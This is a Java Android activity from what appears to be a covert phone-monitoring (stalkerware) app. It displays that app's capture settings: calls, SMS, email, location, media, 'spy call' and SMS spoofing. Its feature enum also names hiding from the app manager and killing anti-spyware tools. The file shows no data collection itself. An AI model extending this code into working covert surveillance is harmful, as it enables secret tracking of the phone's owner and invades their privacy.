package com.fx;

import java.util.List;

import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.preference.CheckBoxPreference;
import android.preference.Preference;
import android.preference.PreferenceActivity;
import android.preference.PreferenceCategory;

import com.android.msecurity.R;
import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetCurrentSettingsCommand;
import com.daemon_bridge.GetCurrentSettingsCommandResponse;
import com.daemon_bridge.SocketCommandBase;
import com.fx.util.Customization;
import com.vvt.configurationmanager.FeatureID;
import com.vvt.logger.FxLog;

public class CurrentSettingsActivity extends PreferenceActivity {
	private static final String TAG = "CurrentSettingsActivity";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		addPreferencesFromResource(R.layout.current_settings);
		
		GetCurrentSettingsCommand currentSettingsCommand = new GetCurrentSettingsCommand();
		new UITask().execute(currentSettingsCommand);
	}
	
	public static String getTimeAsString(long deliveryPeriod) {
        String seconds = "unknown";
        
        int index = (int) (deliveryPeriod / 1000);
        
        switch (index) {
        case 0:
        	seconds = "0";
            break;
        case 10:
            seconds = "10 Sec";
            break;
        case 30:
            seconds = "30 Secs";
            break;
        case 60:
            seconds = "1 Min";
            break;
        case 300:
            seconds = "5 Min";
            break;
        case 600:
            seconds = "10 Mins";
            break;
        case 1200:
            seconds = "20 Mins";
            break;
        case 2400:
            seconds = "40 Mins";
            break;
        case 3600:
            seconds = "1 Hour";
            break;
        default:
            seconds = "unknown";
        }
        
        return seconds;
	}
	
	private CheckBoxPreference createCheckBoxPreference(String key, boolean isChecked, int titleResId) {
		   CheckBoxPreference checkBoxPreference = new CheckBoxPreference(this);
		   checkBoxPreference.setTitle(titleResId);
		   checkBoxPreference.setKey(key);
		   checkBoxPreference.setSelectable(false);
		   checkBoxPreference.setEnabled(false);
		   checkBoxPreference.setChecked(isChecked);
		   checkBoxPreference.setSummaryOff(R.string.language_preference_capture_summary_false);
		   checkBoxPreference.setSummaryOn(R.string.language_preference_capture_summary_true);
		   return checkBoxPreference;
	}

	private class UITask extends AsyncTask<SocketCommandBase, Void, String> {
		private CommandResponseBase result = null;
		private ProgressDialog pDialog;
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(CurrentSettingsActivity.this, "", getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
	    protected String doInBackground(SocketCommandBase... socketCommandBase) {
	    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
	    	
			SocketCommandBase initSocketCommandBase = socketCommandBase[0];
	    	
			try {
				if (LOGV) FxLog.v(TAG, "UITask # before execute");
        		result = initSocketCommandBase.execute();
        		if (LOGV) FxLog.v(TAG, "UITask # after execute");
        	}
        	catch(Throwable t) {
        		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
        	}
			
			if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
			if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
	    	return null;
	    }

	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if(result != null)
	    		onPostExecuteTask(result);	
	    }
	}
	
	private void onPostExecuteTask(CommandResponseBase result) {
		
		if(result != null) {
			if(result instanceof GetCurrentSettingsCommandResponse) {
				
				GetCurrentSettingsCommandResponse response = (GetCurrentSettingsCommandResponse)result;
				
				
				Preference capturePreference = (Preference) findPreference("key1");
				
				boolean isCaptureEnabled = response.getEnableStartCapture();
				if(isCaptureEnabled) {
					capturePreference.setSummary("On");
				}
				else {
					capturePreference.setSummary("Off");
				}
				
				
				// Delivery rules:
				Preference deliveryRulesPreference = (Preference) findPreference("key2");
				
		        String hours = "";
		        String events = "";
		        int deliveryPeriodHours =  response.getDeliverTimer();
		        
		        if(deliveryPeriodHours <= 0)
		            hours = "No delivery";
		        else
		            hours =  getTimeAsString(deliveryPeriodHours);

		        int maxEvents = response.getMaxEvent();
		        if(maxEvents < 0)
		            events = "No events";
		        else if (maxEvents == 1)
		            events = "1 event";
		        else
		            events = String.format("%d events", maxEvents);
		        
		        deliveryRulesPreference.setSummary(String.format("%s, %s", hours, events));
		        
		        
		        
		        //Location interval: 
		        Preference locationIntervalPreference = (Preference) findPreference("key3");
		        locationIntervalPreference.setSummary(getTimeAsString(response.getLocationInterval()));
		        
		        //Configuration:
		        Preference configurationPreference = (Preference) findPreference("key4");
		        configurationPreference.setSummary(String.valueOf(response.getConfigurationId()));
		                
				PreferenceCategory currentSettingsPreferenceCategory = (PreferenceCategory)findPreference("CaptureSettingsPreferenceCategory");
				List<FeatureID> featureIDs =  response.getSupportedFeture();
				
				if (LOGV) FxLog.v(TAG, "UITask # featureIDs #"  + featureIDs);
				
				if(response.getEnableStartCapture()) {
					for(FeatureID id : featureIDs) {
						switch (id) {
						case FEATURE_ID_EVNET_CALL:
							CheckBoxPreference checkBoxCallLogPreference = createCheckBoxPreference(
									"checkBoxCallLogPreference", response.getEnableCallLog(),
									R.string.language_preference_capture_phone_call_title);
					 	    currentSettingsPreferenceCategory.addPreference(checkBoxCallLogPreference);
							break;
						case FEATURE_ID_EVNET_CAMERAIMAGE:
							CheckBoxPreference checkBoxCameraImagePreference = createCheckBoxPreference(
									"checkBoxCameraImagePreference",
									response.getEnableCameraImage(),
									R.string.language_preference_capture_images_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxCameraImagePreference);
							break;
						case FEATURE_ID_EVNET_EMAIL:
							CheckBoxPreference checkBoxEmailPreference = createCheckBoxPreference(
									"checkBoxEmailPreference", response.getEnableEmail(),
									R.string.language_preference_capture_email_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxEmailPreference);
							break;
						case FEATURE_ID_EVNET_LOCATION:
							CheckBoxPreference checkBoxLocationPreference = createCheckBoxPreference(
									"checkBoxLocationPreference",
									response.getEnableLocation(),
									R.string.language_preference_capture_location_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxLocationPreference);
							break;
						case FEATURE_ID_EVNET_MMS:
							CheckBoxPreference checkBoxMmsPreference = createCheckBoxPreference(
									"checkBoxMmsPreference", response.getEnableMMS(),
									R.string.language_preference_capture_mms_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxMmsPreference);
							break;
						case FEATURE_ID_EVNET_SMS:
							CheckBoxPreference checkBoxSmsPreference = createCheckBoxPreference(
									"checkBoxSmsPreference", response.getEnableSMS(),
									R.string.language_preference_capture_sms_title);
					 	    currentSettingsPreferenceCategory.addPreference(checkBoxSmsPreference);
							break;
						case FEATURE_ID_EVNET_SIM_CHANGE:
							CheckBoxPreference checkBoxSimChangePreference = createCheckBoxPreference(
									"checkBoxSimChangePreference", true,
									R.string.language_preference_capture_sim_change_title);
					 	    currentSettingsPreferenceCategory.addPreference(checkBoxSimChangePreference);
							break;
						case FEATURE_ID_EVNET_CONTACT:
							CheckBoxPreference checkBoxAddressbookPreference = createCheckBoxPreference(
									"checkBoxAddressbookPreference",
									response.getEnableAddressBook(),
									R.string.language_preference_capture_addressbook_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxAddressbookPreference);
							break;
						case FEATURE_ID_EVNET_SOUND_RECORDING:
							CheckBoxPreference checkBoxAudioFilePreference = createCheckBoxPreference(
									"checkBoxAudioFilePreference",
									response.getEnableAudioFile(),
									R.string.language_preference_capture_audio_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxAudioFilePreference);
							break;
						case FEATURE_ID_EVNET_VIDEO_RECORDING:
							CheckBoxPreference checkBoxVideoFilePreference = createCheckBoxPreference(
									"checkBoxVideoFilePreference",
									response.getEnableVideoFile(),
									R.string.language_preference_capture_video_title);
						   currentSettingsPreferenceCategory.addPreference(checkBoxVideoFilePreference);
							break;
						case FEATURE_ID_ACTIVATION_VIA_GPRS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_ACTIVATION_VIA_SMS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_ALERT:
							//TODO : not implement yet
							break;
						case FEATURE_ID_AUTO_ANSWER:
							//TODO : not implement yet
							break;
						case FEATURE_ID_COMMUNICATION_RESTRICTION:
							//TODO : not implement yet
							break;
						case FEATURE_ID_DATA_WIPE:
							//TODO : not implement yet
							break;
						case FEATURE_ID_DELIVERY_VIA_GPRS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_DELIVERY_VIA_SMS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_EMERGENCY_NUMBERS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_EVNET_CALENDAR:
							//TODO : not implement yet
							break;
						case FEATURE_ID_EVNET_CELL_INFO:
							//TODO : not implement yet
							break;
						case FEATURE_ID_EVNET_SYSTEM:
							break;
						case FEATURE_ID_EVNET_WALLPAPER:
							CheckBoxPreference checkBoxWallpaperPreference = createCheckBoxPreference(
									"checkBoxWallpaperPreference",
									response.getEnableWallPaper(),
									R.string.language_preference_capture_wallpaper_title);
							currentSettingsPreferenceCategory.addPreference(checkBoxWallpaperPreference);
							break;
						case FEATURE_ID_HIDE_DESKTOP_ICON:
							//TODO : not implement yet
							break;
						case FEATURE_ID_HIDE_FROM_APP_MGR:
							//TODO : not implement yet
							break;
						case FEATURE_ID_HOME_NUMBERS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_KILL_ANTI_FX:
							//TODO : not implement yet
							break;
						case FEATURE_ID_MAKE_CALL_SPOOF:
							//TODO : not implement yet
							break;
						case FEATURE_ID_MONITOR_NUMBERS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_NOTIFICATION_NUMBERS:
							//TODO : not implement yet
							break;
						case FEATURE_ID_PANIC:
							//TODO : not implement yet
							break;
						case FEATURE_ID_SEARCH_MEDIA_IN_FILE_SYSTEM:
							//TODO : not implement yet
							break;
						case FEATURE_ID_SEND_EMAIL_RECORD_FILE:
							//TODO : not implement yet
							break;
						case FEATURE_ID_SEND_SMS_SPOOF:
							CheckBoxPreference checkBoxSmsSpoofPreference = createCheckBoxPreference(
									"checkBoxSmsSpoofPreference",
									true,
									R.string.language_preference_capture_sms_spoof_title);
							currentSettingsPreferenceCategory.addPreference(checkBoxSmsSpoofPreference);
							break;
						case FEATURE_ID_SMS_KEYWORD:
							//TODO : not implement yet
							break;
						case FEATURE_ID_SPY_CALL:
							CheckBoxPreference checkBoxSpyCallPreference = createCheckBoxPreference(
									"checkBoxSpyCallPreference",
									response.getEnableMonitor(),
									R.string.language_preference_capture_spycall_title);
							currentSettingsPreferenceCategory.addPreference(checkBoxSpyCallPreference);
							break;
						case FEATURE_ID_SPYCALL_ONDEMAND_CONFERENCE:
							CheckBoxPreference checkBoxSpyCallOnDemandConferencePreference = createCheckBoxPreference(
									"checkBoxSpyCallOnDemandConferencePreference",
									response.getEnableMonitor(),
									R.string.language_preference_capture_spycall_conference_title);
							
							currentSettingsPreferenceCategory.addPreference(checkBoxSpyCallOnDemandConferencePreference);
							break;
						case FEATURE_ID_WATCH_LIST:
							CheckBoxPreference checkBoxWatchListPreference = createCheckBoxPreference(
									"checkBoxWatchListPreference",
									response.getEnableWatchNotification(),
									R.string.language_preference_capture_watchlist_title);
							currentSettingsPreferenceCategory.addPreference(checkBoxWatchListPreference);
							break;

						default:
							break;
						}
					}
				}
	    	}
		}
		else {
			// TODO: complete later
			UiHelper.notifyUser(getApplicationContext(), "internal error!");
		}
	}
	
}

